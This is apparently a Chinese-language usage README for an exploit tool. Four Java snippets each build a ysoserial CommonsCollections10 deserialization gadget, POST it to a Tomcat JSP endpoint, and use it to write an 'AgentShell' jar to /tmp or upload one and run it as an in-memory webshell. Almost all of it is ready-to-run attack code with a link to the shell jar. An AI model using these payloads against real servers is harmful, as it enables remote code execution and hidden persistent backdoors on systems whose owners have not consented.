# exploit

用默认的 jar ：https://github.com/1nhann/agentshell_jar

写到默认的位置： `/tmp/1nhann.jar`

```java
package top.inhann;

import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.memshell.AgentShell;
import ysoserial.payloads.util.HttpRequest;


public class Test {
    public static void main(String[] args) throws Exception {
        String url = "http://127.0.0.1:8080/tomcattest/test.jsp";
        Object o = new AgentShell().getObject(CommonsCollections10.class);
        byte[] ser = Serializer.serialize(o);
        new HttpRequest(url).addPostData(ser).send();
    }
}

```



用指定的 jar ，写到指定的位置：

```java
package top.inhann;

import ysoserial.Serializer;
import ysoserial.payloads.*;
import ysoserial.payloads.memshell.AgentShell;
import ysoserial.payloads.util.HttpRequest;
import ysoserial.payloads.util.ReadWrite;

public class Test {
    public static void main(String[] args) throws Exception{
        String url = "http://127.0.0.1:8080/tomcattest/test.jsp";
        byte[] jarContent = ReadWrite.readResource(Test.class,"内存马/agentshell.jar");
        Object o = new AgentShell().getObject(CommonsCollections10.class,jarContent,"/tmp/2.jar");
        byte[] ser = Serializer.serialize(o);
        new HttpRequest(url).addPostData(ser).send();
    }
}
```



分两步，先上传 jar ，然后通过java代码使用 jar：

```java
package top.inhann;

import ysoserial.Serializer;
import ysoserial.payloads.*;
import ysoserial.payloads.memshell.AgentShell;
import ysoserial.payloads.util.HttpRequest;

public class Test {
    public static void main(String[] args) throws Exception{
        String url = "http://127.0.0.1:8080/tomcattest/test.jsp";
        Object o = new Eval().uploadFile(CommonsCollections10.class,"D:\\agentshell.jar","/tmp/1.jar");
        byte[] ser = Serializer.serialize(o);
        new HttpRequest(url).addPostData(ser).send();

        o = new AgentShell().getObject(CommonsCollections10.class,"/tmp/1.jar");
        ser = Serializer.serialize(o);
        new HttpRequest(url).addPostData(ser).send();
    }
}

```

分两步，先上传 jar ，然后通过命令行使用 jar：

```java
package top.inhann;

import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.Eval;
import ysoserial.payloads.util.HttpRequest;

public class Test {
    public static void main(String[] args) throws Exception{
        String url = "http://127.0.0.1:8080/tomcattest/test.jsp";
        Object o = new Eval().uploadFile(CommonsCollections10.class,"D:\\agentshell.jar","/tmp/2.jar");
        byte[] ser = Serializer.serialize(o);
        new HttpRequest(url).addPostData(ser).send();

        o = new CommonsCollections10().getObject("java -jar /tmp/2.jar /tmp/2.jar");
        ser = Serializer.serialize(o);
        new HttpRequest(url).addPostData(ser).send();
    }
}

```
 
